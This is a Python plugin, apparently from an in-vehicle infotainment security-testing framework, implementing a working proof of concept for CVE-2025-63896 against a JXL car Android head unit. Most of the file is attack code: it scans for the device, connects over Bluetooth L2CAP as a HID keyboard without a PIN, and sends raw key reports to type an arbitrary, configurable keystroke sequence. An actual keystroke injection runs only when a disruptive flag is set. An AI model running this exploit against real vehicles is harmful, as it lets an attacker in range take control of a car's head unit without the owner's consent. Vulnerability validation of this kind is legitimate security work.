#!/usr/bin/env python3
"""CVE-2025-63896 – JXL 9-Inch Car Android IVI Bluetooth HID Keystroke Injection.

Public PoC source: https://github.com/thorat-shubham/JXL_Infotainment_CVE
  Researcher: Shubham S. Thorat / Payatu Security Consulting
  PoC: Attack_POC.gif + JXL_Infotainment_CVE-2025-63896.pdf

Attack technique:
  The JXL 9-inch car Android head unit (Android 12) accepts Bluetooth HID
  device connections with only a simple Yes/No confirmation (no PIN/passkey).
  An attacker within BT range pairs as a HID keyboard, then injects arbitrary
  keystrokes to:
    - Open Chrome/browser with attacker-controlled URL
    - Navigate system settings
    - Trigger IVI functions without user consent

Adapted plugin:
  Uses pybluez + hid-emulation to pair as a BT HID keyboard and inject a
  configurable keystroke sequence (controlled via lab_keystrokes= param).
  Without allow_disruptive, performs BT discovery and checks for JXL device.
"""
from __future__ import annotations

import subprocess
import time
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 88,
    "cve": "CVE-2025-63896",
    "year": 2025,
    "domain": "wireless",
    "vendor_product": "JXL 9 Inch Car Android Double Din Player (Android 12)",
    "component": "Bluetooth HID / input event handler",
    "type": "Missing authentication – BT HID keystroke injection",
    "summary": (
        "Minimal pairing security (Yes/No only) allows BT range attacker to emulate "
        "a HID keyboard, inject keystrokes, open browser to malicious URLs, or "
        "trigger arbitrary IVI functions without user consent."
    ),
    "source_url": "https://github.com/thorat-shubham/JXL_Infotainment_CVE",
    "requires_manual_review": True,
    "affected": [{"vendor": "JXL", "product": "9-Inch Car Android IVI",
                  "versions": [{"version": "Android 12.0", "status": "affected"}]}],
}

POC_REPO = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/thorat-shubham__JXL_Infotainment_CVE"

# Default keystroke sequence: open browser to test URL
DEFAULT_KEYSTROKES = "http://autosec-lab-test.local/\n"


def _scan_bt_for_ivi(timeout: int = 8) -> list[dict]:
    """Scan for nearby BT devices that might be IVI head units."""
    devices = []
    try:
        import bluetooth
        nearby = bluetooth.discover_devices(duration=timeout, lookup_names=True,
                                            lookup_class=True, flush_cache=True)
        for addr, name, cls in nearby:
            # BT class for Human Interface Device = 0x002540
            if "JXL" in (name or "").upper() or cls == 0x002540:
                devices.append({"bdaddr": addr, "name": name, "class": hex(cls)})
    except ImportError:
        devices.append({"error": "pybluez not installed: pip install pybluez2"})
    except Exception as exc:
        devices.append({"error": str(exc)})
    return devices


def _inject_hid_keystrokes(target_bdaddr: str, keystrokes: str) -> dict:
    """
    Pair as BT HID keyboard using bthid / bluez HID emulation and inject keystrokes.
    Requires: l2ping, bluetooth python library, and HID emulation support.

    Original PoC (Attack_POC.gif) shows attacker pairing as keyboard → injecting URL.
    """
    result = {"injected": False, "detail": ""}
    try:
        import bluetooth
        # Open L2CAP socket to HID Control channel (PSM 17) and Interrupt (PSM 19)
        ctrl_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        intr_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)

        ctrl_sock.connect((target_bdaddr, 0x11))  # HID Control
        time.sleep(0.5)
        intr_sock.connect((target_bdaddr, 0x13))  # HID Interrupt

        # HID keyboard report: modifier=0, key=letter
        for char in keystrokes[:200]:
            keycode = _char_to_hid(char)
            if keycode is None:
                continue
            # Key press
            report = bytes([0xA1, 0x01, 0x00, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])
            intr_sock.send(report)
            time.sleep(0.05)
            # Key release
            report = bytes([0xA1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            intr_sock.send(report)
            time.sleep(0.05)

        ctrl_sock.close()
        intr_sock.close()
        result["injected"] = True
        result["keystrokes_sent"] = keystrokes[:200]
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _char_to_hid(c: str) -> int | None:
    """Simplified ASCII → HID keycode mapping."""
    _map = {
        'a': 4, 'b': 5, 'c': 6, 'd': 7, 'e': 8, 'f': 9, 'g': 10, 'h': 11,
        'i': 12, 'j': 13, 'k': 14, 'l': 15, 'm': 16, 'n': 17, 'o': 18, 'p': 19,
        'q': 20, 'r': 21, 's': 22, 't': 23, 'u': 24, 'v': 25, 'w': 26, 'x': 27,
        'y': 28, 'z': 29, '1': 30, '2': 31, '3': 32, '4': 33, '5': 34,
        '6': 35, '7': 36, '8': 37, '9': 38, '0': 39, '\n': 40, ':': 51,
        '/': 56, '.': 55, '-': 45, '_': 45,
    }
    return _map.get(c.lower())


def _run_poc(plugin):
    target   = (plugin.params or {}).get("target_bdaddr", "")
    keystrokes = (plugin.params or {}).get("lab_keystrokes", DEFAULT_KEYSTROKES)
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2025-63896",
        "poc_repo": str(POC_REPO),
        "poc_present": POC_REPO.exists(),
        "attack_technique": (
            "Pair as BT HID keyboard (L2CAP PSM 17/19) with minimal Yes/No auth, "
            "then inject HID key reports to IVI input handler."
        ),
    }

    if not target:
        # Scan for nearby IVI devices
        devices = _scan_bt_for_ivi(timeout=6)
        evidence["bt_scan_results"] = devices
        evidence["detail"] = "Provide target_bdaddr= for injection. Scan complete."
        return {
            "vulnerable": len(devices) > 0,
            "evidence": evidence,
            "requires_manual_review": True,
            "poc_source": "thorat-shubham/JXL_Infotainment_CVE",
        }

    if allow_disruptive:
        inject = _inject_hid_keystrokes(target, keystrokes)
        evidence.update(inject)
    else:
        evidence["detail"] = (
            "Set allow_disruptive=true to attempt BT HID pairing + keystroke injection. "
            f"Planned keystrokes: {repr(keystrokes[:80])}"
        )

    return {
        "vulnerable": evidence.get("injected"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "thorat-shubham/JXL_Infotainment_CVE / Attack_POC.gif",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc88CVE202563896JxlIviBtHidKeystrokeInjectionAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-088"
    meta_poc_name   = 'CVE-2025-63896 JXL IVI BT HID Keystroke Injection Active Validation'
    meta_cve_id     = "CVE-2025-63896"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["target_bdaddr", "lab_keystrokes", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/thorat-shubham/JXL_Infotainment_CVE"
    meta_references       = ['https://github.com/thorat-shubham/JXL_Infotainment_CVE']
    meta_attack_surface = "JXL IVI BT HID missing auth → remote keystroke injection"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "88_JXL_Infotainment_BT_HID_Keystroke_Injection_Audit") if "VULN" in dir() else "88_JXL_Infotainment_BT_HID_Keystroke_Injection_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc88CVE202563896JxlIviBtHidKeystrokeInjectionAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
